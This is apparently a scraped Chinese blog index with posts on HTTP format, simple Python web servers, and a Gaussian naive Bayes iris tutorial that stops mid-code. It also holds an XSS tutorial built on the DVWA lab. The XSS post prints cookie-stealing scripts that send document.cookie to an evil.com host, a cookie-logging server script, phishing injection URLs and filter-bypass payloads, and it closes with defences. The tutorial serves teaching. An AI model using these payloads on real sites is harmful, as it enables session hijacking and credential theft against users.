Web采⽤的HTTP协议采⽤了⾮常简单的请求-响应模式，从⽽⼤⼤简化 了开发。当我们编写⼀个⻚⾯时，我们只需要在HTTP请求中把HTML 发送出去，不需要考虑如何附带图⽚、视频等，浏览器如果需要请求图 ⽚和视频，它会发送另⼀个HTTP请求，因此，⼀个HTTP请求只处理 ⼀个资源(此时就可以理解为TCP协议中的短连接，每个链接只获取⼀ 个资源，如需要多个就需要建⽴多个链接) 3.2 HTTP格式每个HTTP请求和响应都遵循相同的格式，⼀个HTTP包含Header和Body两 部分，其中Body是可选的。HTTP协议是⼀种⽂本协议，所以，它的格式也⾮常简单 HTTP GET请求的格式：1234GET &#x2F;path HTTP&#x2F;1.1 Header1: Value1 Header2: Value2 Header3: Value3 每个Header⼀⾏⼀个，换⾏符是\\r\\n HTTP POST请求的格式：123456POST &#x2F;path HTTP&#x2F;1.1Header1: Value1Header2: Value2Header3: Value3body data goes here... 当遇到连续两个\\r\\n时，Header部分结束，后⾯的数据全部是Body HTTP响应的格式：123456200 OK Header1: Value1 Header2: Value2 Header3: Value3 body data goes here... HTTP响应如果包含body，也是通过\\r\\n\\r\\n来分隔的 请再次注意，Body的数据类型由Content-Type头来确定，如果是⽹⻚，Body就是⽂本，如果是图⽚，Body就是图⽚的⼆进制数据。 当存在Content-Encoding时，Body数据是被压缩的，最常⻅的压缩⽅式是gzip，所以，看到Content-Encoding:gzip时，需要将Body数据先解压缩，才能得到真正的数据。压缩的⽬的在于减少Body的⼤⼩，加快⽹络传输。","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"}]},{"title":"【python-Web服务器】1.3 python-Web静态服务器-2-显示需要的页面","slug":"1.3 python-Web静态服务器-2-显示需要的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-08T13:09:52.771Z","comments":true,"path":"2020/04/06/1.3 python-Web静态服务器-2-显示需要的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个可以显示需要页面的Web静态服务器。","text":"本文使用python写个可以显示需要页面的Web静态服务器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding: utf-8import socketfrom multiprocessing import Processimport reHTML_ROOT_DIR = \"./html\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # \"GET / HTTP/1.1\" request_start_line = request_lines[0] file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close()","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【XSS（一）】1.1 XSS介绍与原理","slug":"1.1 XSS介绍与原理","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-14T08:52:36.280Z","comments":true,"path":"2020/04/06/1.1 XSS介绍与原理/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。","text":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。 0x01 基础知识1.1 XSS简介跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 关键点： 目标网站的目标用户 浏览器 不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时被浏览器解析执行 “跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。 总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行 1.2 XSS分类反射型 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 服务器端代码： 1234567 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 存储型 持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 服务器端代码： 123456789101112131415&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close(); &#125;?&gt; 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 DOM型 传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 HTML 代码： 1234567891011&lt;html&gt; &lt;head&gt; &lt;title&gt;DOM-XSS test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a=document.URL; document.write(a.substring(a.indexOf(\"a=\")+2,a.length)); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 将代码保存在 domXSS.html 中，浏览器访问： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt; DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应 1.3 XSS 利用方式Cookies 窃取 攻击者可以使用以下代码获取客户端的 Cookies 信息 ： 12345&lt;script&gt;document.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookienew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&lt;/script&gt;&lt;img src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&gt;&lt;/img&gt; 在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： 123456789&lt;% msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;) testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;) set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;) set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;) thisfile.close set fs&#x3D;nothing%&gt; 123456&lt;?php$cookie = $_GET['cookie'];$log = fopen(\"cookie.txt\", \"a\");fwrite($log, $cookie . \"\\n\");fclose($log);?&gt; 攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 会话劫持 由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。 如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。 比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 钓鱼 重定向钓鱼 把当前页面重定向到一个钓鱼页面。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt; HTML 注入式钓鱼 使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 该段代码会在正常页面中嵌入一个 Form 表单。 iframe 钓鱼 这种方式是通过&lt;iframe&gt;标签嵌入远程域的一个页面实施钓鱼。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt; Flash 钓鱼 将构造好的 Flash 文件传入服务器，在目标网站用 &lt;object&gt; 或 &lt;embed&gt; 标签引用即可。 高级钓鱼技术 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 网页挂马 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 &lt;iframe&gt; 标签 DOS 与 DDOS¶注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。 XSS 蠕虫 ¶通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。 Self-XSS 变废为宝的场景 ¶Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。 登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录 这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作： 恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload JavaScript Payload 生成 &lt;iframe&gt; 标签，并在框架内执行以下这些操作 让受害者登出攻击者的账号 然后使得受害者通过 CSRF 登录到自己的账户个人信息界面 攻击者从页面提取 CSRF Token 然后可以使用 CSRF Token 提交修改用户的个人信息 这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；X-Frame-Options 需要被设置为同源（该页面可以在相同域名页面的 iframe 中展示 ） 登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证 让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面 让用户登录我们的账户页面出现 XSS，利用 使用 &lt;iframe&gt; 标签等执行恶意代码 登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session 1.4 正则表达式规则 以一个网上商城应用 Magento 中的过滤类 Mage_Core_Model_Input_Filter_MaliciousCode 为例，部分代码如下： 1234567891011121314protected $_expressions = array( '/(\\/\\*.*\\*\\/)/Us', '/(\\t)/', '/(javascript\\s*:)/Usi', '/(@import)/Usi', '/style=[^&lt;]*((expression\\s*?\\([^&lt;]*?\\))|(behavior\\s*:))[^&lt;]*(?=\\&gt;)/Uis', '/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\\&gt;)/Uis', '/&lt;\\/?(script|meta|link|frame|iframe).*&gt;/Uis', '/src=[^&lt;]*base64[^&lt;]*(?=\\&gt;)/Uis',);function filter($value) &#123; return preg_replace($this-&gt;_expressions, '', $value);&#125; 数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 &lt;script&gt;foo&lt;/script&gt; 时，两个标签都会被移除而只剩下 foo。 0x02 简单实例分析以下三个类型的实例，环境为DVWA平台，系统为windows 2.1 反射型XSS-Low等级 先利用alert测试是否存在xss 出现弹窗，说明存在xss漏洞 源码分析 1234567891011&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞 编写PHP文档获取页面的cookie： 12345&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; 编写js代码将页面的cookie发送到cookie.php中 当在火狐浏览器中在，以下位置输入 1&lt;script&gt;document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie&lt;/script&gt; 并点击提交，页面跳转，说明执行了js代码 1 跳转至下页面，并打开cookie.txt 如上图，表示成功拿到cookie，也就可以通过cookie登陆dvwa js代码分析： document.location [document 对象] :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 document.location 包含 href 属性，直接取值赋值时相当于 document.location.href。document.location.href 当前页面完整 URL 2.2 反射型XSS-Medium等级 先利用alert进行弹窗测试 发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·&lt;script&gt;标签关键字，但是只过滤一次，所以可以想办法绕过 绕过1： 通过构造两个标签，即嵌套 出现弹窗，说明存xss 绕过2：也可以大小写混写进行绕过 出现弹窗，说明存在xss 然后利用js代码获取cookie,成功拿到cookie 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; str_replace()对&lt;script&gt;进行了过滤‘ 2.3 反射型XSS-High等级 还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。 接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML） Img：&lt;img src=x onerror=alert(1)&gt; Iframe: &lt;iframe onload=alert(1)&gt; 两个都成功的出现弹窗 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 利用preg_replace()正则表达过滤掉所有形式的&lt;script&gt; 观察下面反射型xss-impossible等级代码 123456789101112131415 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\"; &#125; // Generate Anti-CSRF tokengenerateSessionToken();?&gt; 代码采用了Anti-CSRF token机制 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 0x03 防范措施3.1 HttpOnly 防止劫取 Cookie 攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 3.2 用户端输入检查 对于用户的任何输入要进行检查、过滤和转义。 建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击： 12345678910&#x2F;&#x2F; vuejs 中的 decodingMap&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉const decodingMap &#x3D; &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39; &#39;: &#39;\\n&#39;&#125; 3.3 服务端输出检查 用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面","slug":"1.2 python-Web静态服务器-1-显示固定的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:45:04.116Z","comments":true,"path":"2020/04/06/1.2 python-Web静态服务器-1-显示固定的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个简单的Web静态服务器","text":"本文使用python写个简单的Web静态服务器 12345678910111213141516171819202122232425262728293031323334# coding: utf-8import socketfrom multiprocessing import ProcessHTML_ROOT_DIR = \"\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"hello world\" response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() 服务端 客户端","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【机器学习算法】鸢尾花数据集GaussianNB分类预测","slug":"鸢尾花数据集GaussianNB分类预测","date":"2020-04-04T16:00:00.000Z","updated":"2020-04-05T05:29:41.655Z","comments":true,"path":"2020/04/05/鸢尾花数据集GaussianNB分类预测/","link":"","permalink":"https://fishni.github.io/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。","text":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。 0x01 实验流程1.1 加载鸢尾花数据集 采用sklearn.datasets模块导入load_iris数据集 123# load the iris dataset from sklearn.datasets import load_iris iris = load_iris() 1.2 存储特征矩阵和响应向量123# store the feature matrix (X) and response vector (y) X = iris.data y = iris.target 1.3 将X和y分为训练和测试集123# splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) sklearn.model_selection.train_test_split用法 作用：将数组或矩阵拆分为训练集和测试集 语法：sklearn.model_selection.train_test_split(*arrays, **options) train_test_split里面常用的因数（arguments）介绍： arrays：分割对象同样长度的列表或者numpy arrays，矩阵。 test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25. train_size：和test_size相似。 random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。 shuffle和straify不常用。straify就是将数据分层。 返回值：将输入列表拆分为训练和测试集 train_test_split 用法举例： 这个数据集 4列，12行 使用pandas模块，制作数据集 123456789101112import pandas as pdfrom sklearn.model_selection import train_test_splitnamelist = pd.DataFrame(&#123; \"name\" : [\"Suzuki\", \"Tanaka\", \"Yamada\", \"Watanabe\", \"Yamamoto\", \"Okada\", \"Ueda\", \"Inoue\", \"Hayashi\", \"Sato\", \"Hirayama\", \"Shimada\"], \"age\": [30, 40, 55, 29, 41, 28, 42, 24, 33, 39, 49, 53], \"department\": [\"HR\", \"Legal\", \"IT\", \"HR\", \"HR\", \"IT\", \"Legal\", \"Legal\", \"IT\", \"HR\", \"Legal\", \"Legal\"], \"attendance\": [1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1] &#125;)namelist .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 2 Yamada 55 IT 1 3 Watanabe 29 HR 0 4 Yamamoto 41 HR 1 5 Okada 28 IT 1 6 Ueda 42 Legal 1 7 Inoue 24 Legal 0 8 Hayashi 33 IT 0 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。 1namelist_train, namelist_test = train_test_split(namelist, test_size=0.3) 1namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 3 Watanabe 29 HR 0 5 Okada 28 IT 1 1 Tanaka 40 Legal 1 4 Yamamoto 41 HR 1 10 Hirayama 49 Legal 1 9 Sato 39 HR 1 11 Shimada 53 Legal 1 2 Yamada 55 IT 1 1namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 8 Hayashi 33 IT 0 0 Suzuki 30 HR 1 接下来是将testing数据指定为具体数目。test_size=5 12namelist_train, namelist_test = train_test_split(namelist, test_size=5)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 6 Ueda 42 Legal 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 接下来将training data 指定为0.5（training_size=0.5） 12namelist_train, namelist_test = train_test_split(namelist, test_size=None, train_size=0.5)namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 5 Okada 28 IT 1 3 Watanabe 29 HR 0 0 Suzuki 30 HR 1 9 Sato 39 HR 1 shuffle功能 12namelist_train, namelist_test = train_test_split(namelist, shuffle=False)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 1.4 使用高斯模型训练数据集12345678# training the model on training set #引入高斯朴素贝叶斯from sklearn.naive_bayes import GaussianNB # 实例化gnb = GaussianNB() #训练数据 fit相当于traingnb.fit(X_train, y_train) GaussianNB(priors=None, var_smoothing=1e-09)1.5 测试集预测12# making predictions on the testing set y_pred = gnb.predict(X_test) 1.6 比较预测值和实际值123# comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333 sklearn.metrics中的评估方法介绍（https://blog.csdn.net/cherdw/article/details/55813071） 1.7 完整代码1234567891011121314151617181920212223# load the iris dataset from sklearn.datasets 